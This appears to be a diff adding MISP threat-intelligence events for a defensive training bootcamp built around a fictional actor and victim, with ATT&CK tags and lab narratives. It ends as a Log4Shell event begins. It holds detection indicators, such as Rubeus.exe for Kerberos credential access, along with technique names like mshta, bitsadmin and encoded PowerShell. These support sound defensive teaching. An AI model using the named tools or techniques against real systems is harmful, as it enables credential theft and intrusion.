+            "content": "# LAB-4.1 \u2014 Persistence Hunt: Run Keys + Scheduled Tasks\n\n**Case:** CJ-011  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-26  \n**ATT&CK:** T1547.001, T1053.005\n\n## Analyst narrative\nStudents hunt persistence signals in registry and scheduled task telemetry and distinguish benign administrative actions from suspicious CJ tradecraft.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- empire_schtasks_creation_standard_user_2020-09-21031526.json\n- schtask_modification_2020-12-1907505969.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "0ea5a482-0fe4-5038-bda7-305bb33858f8",
+        "info": "IgniteCyber CJ LAB-4.2: Credential Access Signal: Rubeus ASKTGT CreateNetOnly",
+        "date": "2025-08-28",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-4.2"
+          },
+          {
+            "name": "case:CJ-012"
+          },
+          {
+            "name": "day:day-4"
+          },
+          {
+            "name": "attack:technique=\"T1003.003\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"NTDS - T1003.003\""
+          },
+          {
+            "name": "attack:technique=\"T1555\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Credentials from Password Stores - T1555\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "65dfd2f8-c537-5d91-9136-bc5b4dc93efc",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-012",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "8fafe930-96d4-59a7-b931-1d62ae3be9e4",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-4.2_Credential_Access_Rubeus_T1003_003.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "9dfda81f-a01c-5de8-84eb-a868c8cfa16f",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=psh_input_capture_promptforcreds_2020-10-2001320841.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "7a00d7ca-bf63-51e9-84fc-e270f69205d9",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "Rubeus.exe",
+            "to_ids": true,
+            "comment": "Expected lab tooling name for Kerberos-focused credential access exercise.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "source:expected-lab-tooling"
+              },
+              {
+                "name": "lab:LAB-4.2"
+              }
+            ]
+          },
+          {
+            "uuid": "3cd5fc5f-0eb4-5a52-b859-cff7317dc3d4",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "powershell.exe",
+            "to_ids": false,
+            "comment": "PowerShell process context observed in prompt-for-credentials dataset.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "source:process-context"
+              },
+              {
+                "name": "lab:LAB-4.2"
+              }
+            ]
+          },
+          {
+            "uuid": "845aae54-d440-538d-b6f7-bcccf069d2d4",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "credui.dll",
+            "to_ids": false,
+            "comment": "Credential Manager UI DLL loaded in prompt-for-credentials telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "source:credential-ui-artifact"
+              },
+              {
+                "name": "lab:LAB-4.2"
+              }
+            ]
+          },
+          {
+            "uuid": "04918e59-1bf8-56a8-bc56-109aeaa36ef0",
+            "type": "windows-event-id",
+            "category": "External analysis",
+            "value": "5379",
+            "to_ids": false,
+            "comment": "Credential Manager credentials were read / Enumerate Credentials event observed in dataset.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "source:windows-security-evidence"
+              },
+              {
+                "name": "lab:LAB-4.2"
+              }
+            ]
+          },
+          {
+            "uuid": "cf23ada2-47dd-5606-b912-d081823756c8",
+            "type": "user-account",
+            "category": "Attribution",
+            "value": "WORKSTATION5\\wardog",
+            "to_ids": false,
+            "comment": "User context observed in prompt-for-credentials telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-08-28",
+            "Tag": [
+              {
+                "name": "source:account-context"
+              },
+              {
+                "name": "lab:LAB-4.2"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "238d352c-6556-5005-9468-070e9c81a2bd",
+            "name": "LAB-4.2 CTI Event Report",
+            "content": "# LAB-4.2 \u2014 Credential Access Signal: Rubeus ASKTGT CreateNetOnly\n\n**Case:** CJ-012  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-28  \n**ATT&CK:** T1003.003, T1555\n\n## Analyst narrative\nStudents review credential access signals, including credential prompt behavior and credential-manager access, then document confidence and limitations.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- psh_input_capture_promptforcreds_2020-10-2001320841.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "6aa1185a-10b7-5553-b1bc-e89bab13b46b",
+        "info": "IgniteCyber CJ LAB-4.3: Threat Hunting Workflow (ELK): Hypothesis \u2192 Query \u2192 Validate \u2192 Report",
+        "date": "2025-09-02",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-4.3"
+          },
+          {
+            "name": "case:CJ-013"
+          },
+          {
+            "name": "day:day-4"
+          },
+          {
+            "name": "attack:technique=\"T1087\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Account Discovery - T1087\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "93dfc7b9-1998-55e1-8abf-c5cbfa15f29e",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-013",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "9d417d7d-ac48-563f-9e88-cc3025dc6305",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-4.3_Threat_Hunting_Workflow_ELK.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "3fe6c9f9-aeb3-5c7d-ab86-90815479add7",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=schtask_modification_2020-12-1907505969.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "7e75cf71-2cb9-5fec-8aa3-f3d19e50d278",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=empire_schtasks_creation_standard_user_2020-09-21031526.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "c5cb12c3-577f-5b9e-a39d-a959ec909924",
+            "type": "user-account",
+            "category": "Attribution",
+            "value": "THESHIRE\\pgustavo",
+            "to_ids": false,
+            "comment": "Account repeatedly appears across hunt datasets.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "source:hunt-pivot"
+              },
+              {
+                "name": "lab:LAB-4.3"
+              }
+            ]
+          },
+          {
+            "uuid": "ad820ca2-3772-5805-a20a-f727daa7a76b",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "WORKSTATION5.theshire.local",
+            "to_ids": false,
+            "comment": "Primary host for Day 4 hunt pivots.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "source:hunt-pivot"
+              },
+              {
+                "name": "lab:LAB-4.3"
+              }
+            ]
+          },
+          {
+            "uuid": "9d9ae946-c988-53f7-a905-179e7320faaf",
+            "type": "text",
+            "category": "Other",
+            "value": "hunt hypothesis: suspicious scheduled task + PowerShell + account context",
+            "to_ids": false,
+            "comment": "Human-readable hunt hypothesis captured as CTI context.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-02",
+            "Tag": [
+              {
+                "name": "source:analyst-workflow-context"
+              },
+              {
+                "name": "lab:LAB-4.3"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "3a00de98-14e1-5358-86b8-9c3156e92e30",
+            "name": "LAB-4.3 CTI Event Report",
+            "content": "# LAB-4.3 \u2014 Threat Hunting Workflow (ELK): Hypothesis \u2192 Query \u2192 Validate \u2192 Report\n\n**Case:** CJ-013  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-09-02  \n**ATT&CK:** T1087\n\n## Analyst narrative\nStudents convert hypotheses into Elastic queries, validate results against case evidence, and decide what should be promoted into MISP as actionable CTI.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- schtask_modification_2020-12-1907505969.json\n- empire_schtasks_creation_standard_user_2020-09-21031526.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "f2bd249b-945c-514f-a645-105ee0e52ab1",
+        "info": "IgniteCyber CJ LAB-5.1: AI Triage Assistant (Validated Summaries)",
+        "date": "2025-09-09",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-5.1"
+          },
+          {
+            "name": "case:CJ-014"
+          },
+          {
+            "name": "day:day-5"
+          },
+          {
+            "name": "attack:technique=\"T1119\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Automated Collection - T1119\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "8ef9f42e-6e71-5654-b63a-a72f0031273a",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-014",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-09",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "67607656-777c-50aa-b401-4c164543d32d",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-5.1_AI_Triage_Assistant_Validated_Summaries.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-09",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "09fe85a3-2816-5744-a9ef-50d9d1983a55",
+            "type": "text",
+            "category": "Other",
+            "value": "AI validation status: human-reviewed, evidence-backed only",
+            "to_ids": false,
+            "comment": "CTI governance marker for AI-assisted triage outputs.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-09",
+            "Tag": [
+              {
+                "name": "source:ai-validation-control"
+              },
+              {
+                "name": "lab:LAB-5.1"
+              }
+            ]
+          },
+          {
+            "uuid": "758a8927-5bd1-5bd6-b356-69845befd2c3",
+            "type": "text",
+            "category": "Other",
+            "value": "reject unsupported IOC claims",
+            "to_ids": false,
+            "comment": "Quality-control instruction for MISP promotion.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-09",
+            "Tag": [
+              {
+                "name": "source:ai-validation-control"
+              },
+              {
+                "name": "lab:LAB-5.1"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "37f72de4-214f-55e8-9594-6dcb842740fe",
+            "name": "LAB-5.1 CTI Event Report",
+            "content": "# LAB-5.1 \u2014 AI Triage Assistant (Validated Summaries)\n\n**Case:** CJ-014  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-09-09  \n**ATT&CK:** T1119\n\n## Analyst narrative\nStudents use AI to draft triage summaries, then validate every claim against evidence before promoting final CTI or case notes.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "52477a03-e678-5e3f-a8f9-49dfec2b573b",
+        "info": "IgniteCyber CJ LAB-5.2: AI-Assisted Sigma Authoring + Unit Tests",
+        "date": "2025-09-10",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-5.2"
+          },
+          {
+            "name": "case:CJ-015"
+          },
+          {
+            "name": "day:day-5"
+          },
+          {
+            "name": "attack:technique=\"T1027\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Obfuscated Files or Information - T1027\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "037cd702-d897-526c-bb99-1b38da1cf154",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-015",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-10",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "6c3a621c-263e-58ca-9c7d-591e2540ac49",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-5.2_AI_Assisted_Sigma_Authoring_Unit_Tests.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-10",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "812c9b74-c6a1-5c80-9771-8cf9fd0e7320",
+            "type": "text",
+            "category": "Other",
+            "value": "sigma:detection_status=unit-tested",
+            "to_ids": false,
+            "comment": "Detection engineering status marker promoted with the lab CTI.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-10",
+            "Tag": [
+              {
+                "name": "source:detection-metadata"
+              },
+              {
+                "name": "lab:LAB-5.2"
+              }
+            ]
+          },
+          {
+            "uuid": "52353409-eeda-5738-ab45-6f57c4d44322",
+            "type": "text",
+            "category": "Other",
+            "value": "candidate detections: mshta scriptlet, bitsadmin transfer, encoded PowerShell",
+            "to_ids": false,
+            "comment": "Detection candidates tied to earlier CJ evidence.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-10",
+            "Tag": [
+              {
+                "name": "source:detection-metadata"
+              },
+              {
+                "name": "lab:LAB-5.2"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "8ccfaba9-ee1d-5021-89cf-f01d6fb9ae4b",
+            "name": "LAB-5.2 CTI Event Report",
+            "content": "# LAB-5.2 \u2014 AI-Assisted Sigma Authoring + Unit Tests\n\n**Case:** CJ-015  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-09-10  \n**ATT&CK:** T1027\n\n## Analyst narrative\nStudents use AI to accelerate Sigma authoring but validate detections with unit tests and known-good/known-bad examples.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "39a3a1e7-b6c4-55c2-bae5-638c9ee2f73a",
+        "info": "IgniteCyber CJ LAB-5.3: AI-Assisted ATT&CK Mapping + Reporting",
+        "date": "2025-09-11",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-5.3"
+          },
+          {
+            "name": "case:CJ-016"
+          },
+          {
+            "name": "day:day-5"
+          },
+          {
+            "name": "attack:technique=\"T1074\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Data Staged - T1074\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "fed57a2b-4c94-511d-9c18-e8daa334e96d",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-016",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-11",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "01a9ba03-1a60-55bb-99a3-46ca60acf387",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-5.3_AI_Assisted_ATTACK_Mapping_Report.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-11",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "77ec1469-54a5-52f5-b944-6a23964559d3",
+            "type": "text",
+            "category": "Other",
+            "value": "final report pivot: CJ campaign spine event + per-lab MISP events",
+            "to_ids": false,
+            "comment": "Capstone report linkage model.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-11",
+            "Tag": [
+              {
+                "name": "source:report-metadata"
+              },
+              {
+                "name": "lab:LAB-5.3"
+              }
+            ]
+          },
+          {
+            "uuid": "b8753935-d405-5326-844a-72abe43d3f38",
+            "type": "text",
+            "category": "Other",
+            "value": "confidence model: confirmed / likely / possible",
+            "to_ids": false,
+            "comment": "Confidence language for final CTI reporting.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-11",
+            "Tag": [
+              {
+                "name": "source:report-metadata"
+              },
+              {
+                "name": "lab:LAB-5.3"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "d0f5d292-bf49-5dbf-9972-f9a738470e3d",
+            "name": "LAB-5.3 CTI Event Report",
+            "content": "# LAB-5.3 \u2014 AI-Assisted ATT&CK Mapping + Reporting\n\n**Case:** CJ-016  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-09-11  \n**ATT&CK:** T1074\n\n## Analyst narrative\nStudents complete final ATT&CK mapping and reporting, linking MISP event context back to TheHive case evidence and final incident report.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "0d232a5d-718f-53db-bcf6-c59e624933a2",
+        "info": "IgniteCyber CJ CAPSTONE: Project Obsidian Mini-CTF / Full Campaign",
+        "date": "2025-09-12",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:CAPSTONE"
+          },
+          {
+            "name": "case:CJ-017"
+          },
+          {
+            "name": "day:day-5"
+          },
+          {
+            "name": "attack:technique=\"T1566.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1566.001\""
+          },
+          {
+            "name": "attack:technique=\"T1204.002\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Malicious File - T1204.002\""
+          },
+          {
+            "name": "attack:technique=\"T1059.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"PowerShell - T1059.001\""
+          },
+          {
+            "name": "attack:technique=\"T1218.005\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Mshta - T1218.005\""
+          },
+          {
+            "name": "attack:technique=\"T1197\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"BITS Jobs - T1197\""
+          },
+          {
+            "name": "attack:technique=\"T1071.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Web Protocols - T1071.001\""
+          },
+          {
+            "name": "attack:technique=\"T1053.005\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053.005\""
+          },
+          {
+            "name": "attack:technique=\"T1547.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Registry Run Keys / Startup Folder - T1547.001\""
+          },
+          {
+            "name": "attack:technique=\"T1003.003\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"NTDS - T1003.003\""
+          },
+          {
+            "name": "attack:technique=\"T1119\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Automated Collection - T1119\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "b76b73ac-3f1e-58aa-8a60-c6dc17c468cb",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-017",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "bedf3a16-c9c3-5afc-9217-643e62bec44d",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=CAPSTONE derived from labs",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "625e821d-3fe9-58e7-aa3f-fee7b8137c15",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=all",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "f0565f89-4816-56b1-9fdc-d7f5786149ea",
+            "type": "threat-actor",
+            "category": "Attribution",
+            "value": "Cinder Jackal",
+            "to_ids": false,
+            "comment": "Fictional training adversary used as campaign spine across the bootcamp.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "source:training-actor"
+              },
+              {
+                "name": "lab:CAPSTONE"
+              }
+            ]
+          },
+          {
+            "uuid": "73f5017e-5ca6-5cd9-bea5-140d30b77389",
+            "type": "target-org",
+            "category": "Attribution",
+            "value": "ApexFin Solutions",
+            "to_ids": false,
+            "comment": "Fictional victim organization for the IgniteCyber Academy bootcamp.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "source:training-victim"
+              },
+              {
+                "name": "lab:CAPSTONE"
+              }
+            ]
+          },
+          {
+            "uuid": "4b192673-9d79-5cb6-bd4f-0138716f157e",
+            "type": "campaign-name",
+            "category": "Attribution",
+            "value": "Project Obsidian / Cinder Jackal",
+            "to_ids": false,
+            "comment": "Campaign name for the final case.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-09-12",
+            "Tag": [
+              {
+                "name": "source:campaign-context"
+              },
+              {
+                "name": "lab:CAPSTONE"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "4596a09e-449e-57e3-8c9a-80e147eefc70",
+            "name": "CAPSTONE CTI Event Report",
+            "content": "# CAPSTONE \u2014 Project Obsidian Mini-CTF / Full Campaign\n\n**Case:** CJ-017  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-09-12  \n**ATT&CK:** T1566.001, T1204.002, T1059.001, T1218.005, T1197, T1071.001, T1053.005, T1547.001, T1003.003, T1119\n\n## Analyst narrative\nCapstone event aggregates validated observables across the full Cinder Jackal campaign for final reporting and scoring.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- all\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "94e9fbe0-4826-5d4d-be02-f45a1fc9a210",
+        "info": "IgniteCyber CJ LAB-3.4: Log4Shell JNDI Reference Traffic",
+        "date": "2025-08-14",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
